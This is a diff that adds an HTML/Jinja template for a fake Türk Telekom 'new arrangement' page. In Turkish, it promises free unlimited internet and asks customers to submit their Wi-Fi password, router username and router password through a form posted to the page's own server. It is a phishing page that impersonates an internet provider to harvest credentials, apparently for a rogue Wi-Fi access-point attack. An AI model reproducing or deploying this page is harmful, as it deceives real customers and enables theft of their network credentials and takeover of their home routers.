@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.6/css/bootstrap.min.css" integrity="sha384-rwoIResjU2yc3z8GV/NPeZWAv56rSmLldC3R/AZzGRnGxQQKnKkoFVhFQhNUwEyJ" crossorigin="anonymous">
+
+    <title>turk telekom</title>
+</head>
+<body>
+       
+       {% from "includes/formhelpers.html" import render_field %}
+
+       <div class="jumbotron text-center">
+
+            <div class="ui-field-contain ui-responsive" style="text-align:center;">
+                     <h4> Turk Telekom Yeni Düzenleme </h4>
+                     <hr>
+                    <h6>Sayın Müşterimiz Lütfen Aşağıdaki Alanları Doldurunuz.</h6>
+                    <h6>2019 da Ek Ücret Alınmadan Kotasız İnternetin Keyfini</h6>
+                    <h6>Çıkarın. TürkTelekom.AŞ Globfone.TürkTelekom.com  </h6>
+                    <br>
+                    <form  method="post">
+                    
+                        {{ render_field(form.userwifipassword,class = "form-control") }}
+                        {{ render_field(form.usernameroutue ,class = "form-control") }}
+                        {{ render_field(form.userrotuepassword ,class = "form-control") }}
+                        <button type="submit" class="btn btn-primary">Onayla </button>
+                   </form>
+             </div>
+
+            
+        </div>
+    
+
+        <script src="https://code.jquery.com/jquery-3.1.1.slim.min.js" integrity="sha384-A7FZj7v+d/sdmMqp/nOQwliLvUsJfDHW+k9Omg/a/EheAdgtzNs3hpfag6Ed950n" crossorigin="anonymous"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/tether/1.4.0/js/tether.min.js" integrity="sha384-DztdAPBWPRXSA/3eYEEUWrWCy7G5KFbe8fFjk5JAIxUYHKkDx6Qin1DkWx51bBrb" crossorigin="anonymous"></script>
+        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.6/js/bootstrap.min.js" integrity="sha384-vBWWzlZJ8ea9aCX4pEW3rVHjgjt7zpkNpZk+02D9phzyeVkE+jo0ieGizqPLForn" crossorigin="anonymous"></script>
+        <script src="https://cdn.ckeditor.com/4.8.0/standard/ckeditor.js"></script>
+        <script src="https://cdn.rawgit.com/google/code-prettify/master/loader/run_prettify.js"></script>
+
+      
+    </body>
+</html>
